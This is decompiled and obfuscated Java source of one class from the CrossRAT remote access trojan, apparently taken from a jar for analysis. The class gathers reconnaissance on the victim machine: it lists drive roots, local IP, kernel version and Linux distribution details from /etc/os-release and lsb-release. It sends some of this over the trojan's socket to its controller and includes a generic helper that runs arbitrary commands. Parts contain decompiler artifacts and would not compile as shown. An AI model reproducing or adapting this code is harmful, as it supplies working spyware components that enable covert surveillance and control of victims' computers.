package crossrat;

import a.a.b;
import a.b.c;
import a.b.d;
import a.b.h;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

public class e
{
  private static String a;
  
  public static void a()
  {
    String str = "";
    try
    {
      File[] arrayOfFile;
      int j = (arrayOfFile = localObject = File.listRoots()).length;
      for (int i = 0; i < j; i++)
      {
        localObject = arrayOfFile[i];
        str = str + localObject + k.e;
      }
      (localObject = new DataOutputStream(k.k.getOutputStream())).writeBytes(k.g + k.d + k.y + k.d + str + k.d + "&&&");
      return;
    }
    catch (Exception localException)
    {
      Object localObject;
      (localObject = localException).printStackTrace();
    }
  }
  
  public static String b()
  {
    if (a == null) {
      try
      {
        Enumeration localEnumeration = NetworkInterface.getNetworkInterfaces();
        while (localEnumeration.hasMoreElements())
        {
          Object localObject = (localObject = (NetworkInterface)localEnumeration.nextElement()).getInetAddresses();
          while (((Enumeration)localObject).hasMoreElements())
          {
            InetAddress localInetAddress;
            if ((!(localInetAddress = (InetAddress)((Enumeration)localObject).nextElement()).isLoopbackAddress()) && (localInetAddress.isSiteLocalAddress()) && (localInetAddress.getHostAddress().indexOf(":") < 0)) {
              a = localInetAddress.getHostAddress();
            }
          }
        }
        if (a == null) {
          a = "127.0.0.1";
        }
      }
      catch (SocketException localSocketException)
      {
        a = "127.0.0.1";
      }
    }
    return a;
  }
  
  public static List a(String[] paramArrayOfString)
  {
    ArrayList localArrayList = new ArrayList();
    paramArrayOfString = Runtime.getRuntime().exec(paramArrayOfString);
    paramArrayOfString = new BufferedReader(new InputStreamReader(paramArrayOfString.getInputStream()));
    Object localObject;
    while ((localObject = paramArrayOfString.readLine()) != null) {
      localArrayList.add(localObject);
    }
    paramArrayOfString.close();
    return localArrayList;
  }
  
  public static Map a(File paramFile, String paramString)
  {
    HashMap localHashMap = new HashMap();
    Iterator localIterator = (paramFile = a(paramFile)).iterator();
    while (localIterator.hasNext())
    {
      String str = (paramFile = (paramFile = (String)localIterator.next()).split(paramString))[0].trim();
      paramFile = paramFile[1].trim();
      localHashMap.put(str, paramFile);
    }
    return localHashMap;
  }
  
  public static List a(File paramFile)
  {
    ArrayList localArrayList = new ArrayList();
    if (paramFile.exists())
    {
      paramFile = new BufferedReader(new InputStreamReader(new FileInputStream(paramFile)));
      Object localObject;
      while ((localObject = paramFile.readLine()) != null) {
        localArrayList.add(localObject);
      }
      paramFile.close();
    }
    return localArrayList;
  }
  
  public static String c()
  {
    String str = null;
    try
    {
      localObject = Runtime.getRuntime().exec(new String[] { "uname", "-a" });
      str = (localObject = new BufferedReader(new InputStreamReader(((Process)localObject).getInputStream()))).readLine();
      ((BufferedReader)localObject).close();
    }
    catch (Exception localException)
    {
      Object localObject;
      (localObject = localException).printStackTrace();
    }
    return str;
  }
  
  public static b a(boolean paramBoolean)
  {
    Object localObject1 = null;
    Object localObject2;
    try
    {
      localObject1 = a(new File("/var/run/dmesg.boot"));
    }
    catch (Exception localException)
    {
      (localObject2 = localException).printStackTrace();
    }
    if (localObject1 != null)
    {
      Iterator localIterator = ((List)localObject1).iterator();
      while (localIterator.hasNext()) {
        if ((localObject1 = b.a(localObject2 = (String)localIterator.next())) != null) {
          return (b)localObject1;
        }
      }
    }
    if ((paramBoolean) && ((localObject1 = b.a(localObject2 = System.getProperty("os.name"))) != null)) {
      return (b)localObject1;
    }
    return null;
  }
  
  public static d d()
  {
    Object localObject1 = null;
    try
    {
      localObject2 = null;
      Object localObject3 = null;
      int i = 0;
      List localList = null;
      try
      {
        i = (localList = a(tmp20_15)).size() == 3 ? 1 : 0;
      }
      catch (Exception localException1)
      {
        (localObject4 = localException1).printStackTrace();
      }
      Object localObject4 = null;
      Map localMap = null;
      try
      {
        localObject4 = a(new File("/etc/os-release"), "=");
      }
      catch (Exception localException2)
      {
        System.out.println("Failed to load /etc/os-release");
      }
      try
      {
        localMap = a(new File("/etc/lsb-release"), "=");
      }
      catch (Exception localException3)
      {
        System.out.println("Failed to load /etc/lsb-release");
      }
      c[] arrayOfc;
      int k = (arrayOfc = c.values()).length;
      for (int j = 0; j < k; j++)
      {
        c localc = arrayOfc[j];
        Object localObject6;
        Object localObject5;
        Object localObject7;
        Object localObject8;
        if ((localObject1 == null) && (i != 0))
        {
          localObject6 = localList.iterator();
          while (((Iterator)localObject6).hasNext())
          {
            localObject8 = (localObject7 = (localObject5 = (String)((Iterator)localObject6).next()).split(":"))[0].trim();
            localObject5 = localObject7[1].trim();
            if (((String)localObject8).equals("Distributor ID"))
            {
              localObject2 = localObject5;
            }
            else if (((String)localObject8).equals("Release"))
            {
              localObject3 = localObject5;
              if (((String)localObject5).toLowerCase().contains("kali"))
              {
                localObject1 = c.a;
                localObject3 = null;
                break;
              }
            }
            else if ((((String)localObject8).equals("Codename")) && (((String)localObject5).toLowerCase().contains("debian")) && (localObject2 != null) && (((String)localObject2).toLowerCase().contains("mint")))
            {
              localObject1 = c.c;
              break;
            }
          }
        }
        if ((localObject1 == null) && (localList == null) && (localObject4 != null))
        {
          localObject5 = (String)((Map)localObject4).get("DISTRIB_ID");
          if ((localObject2 == null) && (localObject5 != null)) {
            localObject2 = ((String)localObject5).replace("\"", "");
          }
          localObject6 = (String)((Map)localObject4).get("NAME");
          if ((localObject5 == null) && (localObject6 != null)) {
            localObject2 = ((String)localObject6).replace("\"", "");
          }
          if ((localObject7 = (String)((Map)localObject4).get("VERSION_ID")) != null) {
            localObject3 = ((String)localObject7).replace("\"", "");
          }
          if ((localObject8 = (String)((Map)localObject4).get("DISTRIB_RELEASE")) != null) {
            localObject3 = ((String)localObject8).replace("\"", "");
          }
          if ((localObject5 = (String)((Map)localObject4).get("DISTRIB_CODENAME")) != null) {
            ((String)localObject5).replace("\"", "");
          }
        }
        if ((localObject1 == null) && (localMap != null))
        {
          if ((localObject5 = (String)((Map)localObject4).get("DISTRIB_ID")) != null) {
            localObject2 = ((String)localObject5).replace("\"", "");
          }
          if ((localObject6 = (String)((Map)localObject4).get("DISTRIB_RELEASE")) != null) {
            localObject3 = ((String)localObject6).replace("\"", "");
          }
          if ((localObject7 = (String)((Map)localObject4).get("DISTRIB_CODENAME")) != null) {
            ((String)localObject7).replace("\"", "");
          }
        }
        if (localObject1 == null)
        {
          if (localc.b().equalsIgnoreCase((String)localObject2)) {
            localObject1 = localc;
          }
          if (localObject2 != null)
          {
            n = (localObject8 = localc.a()).length;
            for (m = 0; m < n; m++) {
              if ((((localObject5 = localObject8[m]) instanceof String)) && ((localObject5 = (String)localObject5).toLowerCase().contains(((String)localObject2).toLowerCase())))
              {
                localObject1 = localc;
                break;
              }
            }
          }
          int n = (localObject8 = localc.a()).length;
          for (int m = 0; m < n; m++) {
            if ((((localObject5 = localObject8[m]) instanceof h)) && ((localObject5 = (h)localObject5).a()) && (localObject1 == null))
            {
              localObject1 = localc;
              break;
            }
          }
        }
        if (localObject1 == c.b) {
          try
          {
            localObject3 = (String)(localObject5 = a(new String[] { "nixos-version" })).get(0);
          }
          catch (Exception localException4)
          {
            (localObject5 = localException4).printStackTrace();
          }
        }
        if (localObject1 != null)
        {
          (localObject5 = new d((c)localObject1)).a((String)localObject3);
          return (d)localObject5;
        }
      }
    }
    catch (Exception localException5)
    {
      Object localObject2;
      (localObject2 = localException5).printStackTrace();
    }
    return new d(c.d);
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\crossrat\e.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */